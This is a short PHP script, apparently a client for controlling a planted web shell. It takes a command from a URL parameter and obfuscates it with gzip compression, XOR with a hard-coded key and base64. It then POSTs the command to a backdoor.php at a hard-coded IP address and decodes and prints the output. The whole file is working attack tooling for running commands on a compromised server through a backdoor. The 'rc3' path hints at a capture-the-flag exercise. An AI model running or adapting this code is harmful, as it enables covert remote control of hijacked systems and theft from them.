<?php
$k="094db036";
$kh="7ef9bf383ded";
$kf="b241e2ed9d4a";
$p="wa1Yv8JoMtD0QJO9";
function x($t,$k){
    $c=strlen($k);
    $l=strlen($t);
    $o="";
    for($i=0;$i<$l;){
        for($j=0;($j<$c&&$i<$l);$j++,$i++){
            $o.=$t{$i}^$k{$j};
        }
    }
    return $o;
}

// Encode Payload

$cmd = $_GET["payload"];
$cmd_encoded = base64_encode(x(gzcompress($_GET['payload']),$k));



// Send Payload

$url = "http://207.154.246.97/rc3/backdoor.php";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $kh . $cmd_encoded . $kf);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
curl_close ($ch);



// Filter Result

$result = str_replace($p , "", $result);
$result = str_replace($kh, "", $result);
$result = str_replace($kf, "", $result);



// Decode Result

$result_decoded = gzuncompress(x(base64_decode($result),$k));
echo "Result: <br> " . $result_decoded;
